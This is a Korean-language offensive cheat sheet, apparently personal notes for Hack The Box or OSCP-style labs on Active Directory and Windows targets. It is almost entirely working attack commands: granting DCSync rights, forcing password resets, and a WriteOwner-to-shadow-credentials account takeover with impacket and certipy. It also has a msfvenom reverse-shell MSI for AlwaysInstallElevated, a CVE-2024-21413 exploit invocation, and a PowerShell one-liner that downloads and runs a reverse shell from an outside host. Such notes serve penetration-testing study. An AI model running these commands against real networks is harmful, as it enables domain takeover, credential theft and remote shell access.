Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco' -Credential $Cred

#도메인 가입 확인
net group "EXCHANGE WINDOWS PERMISSIONS" /domain

***비밀번호 변경***
$NewPassword = ConvertTo-SecureString 'LegmanTeamBenzoin!!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'robert' -AccountPassword $NewPassword -Credential $Cred

```

### WriteDacl (DC Sync 권한 추가)

```c
#가입 시키고 해야함
net user john abc123 /add /domain
net group "Exchange Windows Permissions" john /add

$pass = convertto-securestring 'abc123' -asplain -force
$cred = new-object system.management.automation.pscredential('htb.local\\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

### WriteOwner 권한 (evilwinrm 접속 불가능 할때)

```
시간 동기화해야함!!!!!!

impacket-owneredit -action write -new-owner judith.mader -target 'management' certified.htb/judith.mader:'judith09'
impacket-dacledit -action write -rights WriteMembers -principal judith.mader -target 'management' certified.htb/judith.mader:'judith09'
impacket-net -dc-ip 10.129.231.186 CERTIFIED/judith.mader:'judith09'@certified.htb group -name 'Management' -join 'judith.mader'
certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.231.186

1. **OwnerEdit**: `WriteOwner` 권한을 악용해 그룹의 **주인이 됨**.
2. **DaclEdit**: 주인 권한으로 자신에게 **멤버 추가 권한을 부여함**.
3. **Net**: 자신을 그룹에 **추가함**.
4. **Certipy**: 그룹 멤버십으로 얻은 권한을 통해 `management_svc` 계정에 **백도어 인증서를 심고 계정을 탈취함**.
   -> NTLM 출력됨 출력 안 되면 "시간 동기화 한번"

```

### AlwaysInstallElevated (WinPeas 내부 권한 확인 가능)

```c
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f msi -o rev.msi
msiexec /quiet /qn /i rev.msi

```

### mdb, PST File Open

```c
#mdb file open
<https://www.mdbopener.com/>

#pst file open
readpst test.pst
```

### Mail

```c
swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password homenetworkingadministrator --quit-after AUTH --server mailing.htb

=============================

python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender 0xdf@mailing.htb --recipient maya@mailing.htb --url "\\\\10.10.14.3\\share\\sploit" --subject "Check this out ASAP!"
```

### Azure AD Conn

```c
<https://oscp-notes-2025.gitbook.io/oscp+-notes-2025/lateral/azure-ad-connect-sync>
```

### Invoke-Powershell

```c
powershell IEX(IWR <http://192.168.49.130/Invoke-PowerShellTcp.ps1> -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.130 -Port 4444
```